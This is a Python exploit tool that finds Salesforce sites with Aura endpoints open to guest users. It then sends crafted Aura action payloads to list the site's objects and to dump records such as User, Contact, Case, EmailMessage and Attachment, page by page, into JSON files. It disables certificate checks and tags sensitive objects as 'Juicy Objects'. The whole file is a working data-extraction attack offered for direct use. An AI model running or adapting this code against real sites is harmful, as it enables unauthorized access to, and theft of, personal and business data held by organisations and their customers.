import urllib.request
import urllib.parse
from urllib.error import URLError, HTTPError
import json
from json import JSONDecodeError
import argparse
import re
import os
import sys
import ssl

# Disable SSL verification
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Constants
AURA_PATH_PATTERN = ("aura", "s/aura", "s/sfsites/aura", "sfsites/aura")
PAYLOAD_PULL_CUSTOM_OBJ = '{"actions":[{"id":"pwn","descriptor":"serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData","callingDescriptor":"UNKNOWN","params":{}}]}'
SF_OBJECT_NAME = ('Case', 'Account', 'User', 'Contact', 'Document', 'ContentDocument', 'ContentVersion', 'ContentBody', 'CaseComment', 'Note', 'Employee', 'Attachment', 'EmailMessage', 'CaseExternalDocument', 'Attachment', 'Lead', 'Name', 'EmailTemplate', 'EmailMessageRelation')
DEFAULT_PAGE_SIZE = 100
MAX_PAGE_SIZE = 1000
DEFAULT_PAGE = 1
USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36'

# HTTP request helper function
def http_request(url, values='', method='GET'):
    headers = {'User-Agent': USER_AGENT}
    if method == 'POST':
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        data = urllib.parse.urlencode(values).encode('ascii')
        request = urllib.request.Request(url, data=data, method=method, headers=headers)
    else:
        request = urllib.request.Request(url, method=method, headers=headers)
    
    try:
        with urllib.request.urlopen(request, context=ctx) as response:
            return response.read().decode("utf-8")
    except URLError as e:
        raise

# Check for vulnerable Aura endpoints
def check(url):
    aura_endpoints = []
    for path in AURA_PATH_PATTERN:
        tmp_aura_endpoint = urllib.parse.urljoin(url, path)
        try:
            response_body = http_request(tmp_aura_endpoint, values={}, method='POST')
        except HTTPError as e:
            response_body = e.read().decode("utf-8")
        if "aura:invalidSession" in response_body:
            aura_endpoints.append(tmp_aura_endpoint)
    return aura_endpoints

# Generate Aura context
def get_aura_context(url):
    try:
        response_body = http_request(url)
    except Exception as e:
        print("\033[31m[-] Failed to access the url\033[0m")
        raise

    if ("window.location.href ='%s" % url) in response_body:
        location_url = re.search(r'window.location.href =\'([^\']+)', response_body)
        url = location_url.group(1)
        try:
            response_body = http_request(url)
        except Exception as e:
            print("\033[31m[-] Failed to access the redirect url\033[0m")
            raise

    aura_encoded = re.search(r'\/s\/sfsites\/l\/([^\/]+fwuid[^\/]+)', response_body)
    if aura_encoded is not None:
        response_body = urllib.parse.unquote(aura_encoded.group(1))

    fwuid = re.search(r'"fwuid":"([^"]+)', response_body)
    markup = re.search(r'"(APPLICATION@markup[^"]+)":"([^"]+)"', response_body)
    app = re.search(r'"app":"([^"]+)', response_body)

    if fwuid is None or markup is None or app is None:
        raise Exception("Couldn't find fwuid or markup")
    
    aura_context = f'{{"mode":"PROD","fwuid":"{fwuid.group(1)}","app":"{app.group(1)}","loaded":{{"{markup.group(1)}":"{markup.group(2)}"}},"dn":[],"globals":{{}},"uad":false}}'
    return aura_context

# Payload creation functions
def create_payload_for_getItems(object_name, page_size, page):
    return f'{{"actions":[{{"id":"pwn","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{{"entityNameOrId":"{object_name}","layoutType":"FULL","pageSize":{page_size},"currentPage":{page},"useTimeout":false,"getCount":true,"enableRowActions":false}}}}]}}'

def create_payload_for_getRecord(record_id):
    return f'{{"actions":[{{"id":"pwn","descriptor":"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord","callingDescriptor":"UNKNOWN","params":{{"recordId":"{record_id}","record":null,"inContextOfComponent":"","mode":"VIEW","layoutType":"FULL","defaultFieldValues":null,"navigationLocation":"LIST_VIEW_ROW"}}}}]}}'

# Exploit function
def exploit(aura_endpoint, payload, aura_context):
    url = f"{aura_endpoint}?r=1&applauncher.LoginForm.getLoginRightFrameUrl=1"
    values = {'message': payload, 'aura.context': aura_context, 'aura.token': 'undefined'}
    try:
        response_body = http_request(url, values=values, method='POST')
        return json.loads(response_body)
    except JSONDecodeError as je:
        raise Exception(f"JSON Decode error. Response -> {response_body}")
    except Exception as e:
        raise

# Pull object list with enhanced logging
def pull_object_list(aura_endpoint, aura_context):
    print("\033[33m[+] Pulling the object list\033[0m")
    sf_all_object_name_list = []
    try:
        response = exploit(aura_endpoint, PAYLOAD_PULL_CUSTOM_OBJ, aura_context)
        if response.get('exceptionEvent'):
            raise Exception(response)
        if not response.get('actions') or not response.get('actions')[0].get('state'):
            raise Exception(f"Failed to get actions: {response}")

        SF_OBJECT_NAME_dict = response["actions"][0]["returnValue"]["apiNamesToKeyPrefixes"]
        SF_OBJECT_NAME_list = [key for key in SF_OBJECT_NAME_dict.keys() if not key.endswith("__c")]
        sf_custom_object_name = [key for key in SF_OBJECT_NAME_dict.keys() if key.endswith("__c")]
        sf_all_object_name_list = list(SF_OBJECT_NAME_dict.keys())
        
        print(f"\033[32m[+] Default object list: {', '.join(SF_OBJECT_NAME_list)}\033[0m")
        print(f"\033[32m[+] Custom object list: {', '.join(sf_custom_object_name)}\033[0m")
    except Exception as e:
        print(f"\033[31m[-] Failed to pull the object list: {e}\033[0m")
    return sf_all_object_name_list

# Dump record
def dump_record(aura_endpoint, aura_context, record_id):
    print("\033[33m[+] Dumping the record\033[0m")
    payload = create_payload_for_getRecord(record_id)
    try:
        response = exploit(aura_endpoint, payload, aura_context)
        if response["actions"][0]["state"] != "SUCCESS":
            print("\033[31m[-] Failed to dump the record: State not SUCCESS\033[0m")
            return None
        print(f"\033[32m[+] State: {response['actions'][0]['state']}\033[0m")
        print("\033[32m[+] Record result:\033[0m")
        print(json.dumps(response['actions'][0]['returnValue'], ensure_ascii=False, indent=2))
    except Exception as e:
        print(f"\033[31m[-] Failed to dump the record: {e}\033[0m")
        return None

# Dump object
def dump_object(aura_endpoint, aura_context, object_name, page_size=DEFAULT_PAGE_SIZE, page=DEFAULT_PAGE):
    print(f"\033[33m[+] Getting \"{object_name}\" object (page number {page})...\033[0m")
    payload = create_payload_for_getItems(object_name, page_size, page)
    try:
        response = exploit(aura_endpoint, payload, aura_context)
        if response.get('exceptionEvent'):
            raise Exception(response)
        actions = response['actions'][0]
        state = actions['state']
        return_value = actions['returnValue']
        total_count = return_value.get('totalCount', 'None')
        result_count = return_value.get('result', [])
        print(f"\033[32m[+] State: {state}, Total: {total_count}, Page: {page}, Result count: {len(result_count)}\033[0m")
        if state == "ERROR":
            print(f"\033[31m[-] Error message: {actions['error'][0]}\033[0m")
        return response
    except Exception as e:
        print(f"\033[31m[-] Failed to exploit: {e}\033[0m")
        return None

# Dump and save objects
def dump_and_save_objects(aura_endpoint, aura_context, output_dir, flag_full):
    sf_all_object_name_list = pull_object_list(aura_endpoint, aura_context)
    page_size = MAX_PAGE_SIZE if flag_full else DEFAULT_PAGE_SIZE
    failed_object = []
    dumped_object_count = 0
    
    for object_name in sf_all_object_name_list:
        page = DEFAULT_PAGE
        while True:
            response = dump_object(aura_endpoint, aura_context, object_name, page_size, page)
            if response is None:
                failed_object.append(object_name)
                break
            return_value = response['actions'][0]['returnValue']
            file_path = os.path.join(output_dir, f"{object_name}__page{page}.json")
            with open(file_path, "w", encoding="utf_8") as fw:
                try:
                    fw.write(json.dumps(return_value, ensure_ascii=False, indent=2))
                    dumped_object_count += 1
                except Exception as e:
                    failed_object.append(object_name)
            page += 1
            if not flag_full or return_value is None or not return_value.get('result') or len(return_value['result']) < page_size:
                break
    
    if failed_object:
        print(f"\033[31m[-] Failed to dump objects: {', '.join(failed_object)}. Try manually with -o option.\033[0m")
    return dumped_object_count > (len(sf_all_object_name_list) / 2)

# Initialize argument parser
def init():
    parser = argparse.ArgumentParser(description='Exploit Salesforce through the aura endpoint with the guest privilege')
    parser.add_argument('-u', '--url', required=True, help='set the SITE url. e.g. http://url/site_path')
    parser.add_argument('-o', '--objects', help=f'set the object name. Default is "User". Juicy Objects: {",".join(SF_OBJECT_NAME)}', nargs='*', default=['User'])
    parser.add_argument('-l', '--listobj', help='pull the object list.', action='store_true')
    parser.add_argument('-c', '--check', help='only check aura endpoint', action='store_true')
    parser.add_argument('-a', '--aura_context', help='set your valid aura_context')
    parser.add_argument('-r', '--record_id', help='set the record id to dump the record')
    parser.add_argument('-d', '--dump_objects', help='dump a small number of objects accessible to guest users and save them in files.', action='store_true')
    parser.add_argument('-f', '--full', help='if set with -d, dump all pages of objects.', action='store_true')
    parser.add_argument('-s', '--skip', help='if set with -d, skip objects already dumped.', action='store_true')
    return parser.parse_args()

# Main execution
if __name__ == "__main__":
    args = init()
    print("\033[33m[+] Looking for aura endpoint and checking vulnerability\033[0m")
    aura_endpoints = check(args.url)
    
    if not aura_endpoints:
        print("\033[31m[-] Url doesn't seem to be vulnerable\033[0m")
        sys.exit(0)
    else:
        print(f"\033[32m[+] [VULNERABLE] Found vulnerable endpoint(s): {', '.join(aura_endpoints)}\033[0m")

    if args.check:
        sys.exit(0)

    print("\033[33m[+] Starting exploit\033[0m")
    if args.aura_context and len(args.aura_context) > 1:
        aura_context = args.aura_context
    else:
        try:
            aura_context = get_aura_context(args.url)
            print("\033[33m[+] [INFO] Successfully generated aura.context\033[0m")
        except Exception as e:
            print("\033[31m[-] Failed to get aura context\033[0m")
            sys.exit(0)

    result = False
    for aura_endpoint in aura_endpoints:
        print("-----")
        print(f"\033[32m[+] Endpoint: {aura_endpoint}\033[0m")
        
        if args.listobj:
            pull_object_list(aura_endpoint, aura_context)
        elif args.record_id:
            dump_record(aura_endpoint, aura_context, args.record_id)
        elif args.dump_objects:
            if result and args.skip:
                print("\033[33m[+] Skipping dump\033[0m")
                continue
            url = urllib.parse.urlparse(args.url)
            output_dir = os.path.join(os.getcwd(), f"{url.scheme}_{url.netloc.replace(':', '_')}_{url.path.replace('/', '_')}")
            os.makedirs(output_dir, exist_ok=True)
            result = dump_and_save_objects(aura_endpoint, aura_context, output_dir, args.full)
        elif args.objects:
            for object_name in args.objects:
                response = dump_object(aura_endpoint, aura_context, object_name)
                if response:
                    print("\033[32m[+] Result:\033[0m")
                    print(json.dumps(response['actions'][0]['returnValue'], ensure_ascii=False, indent=2))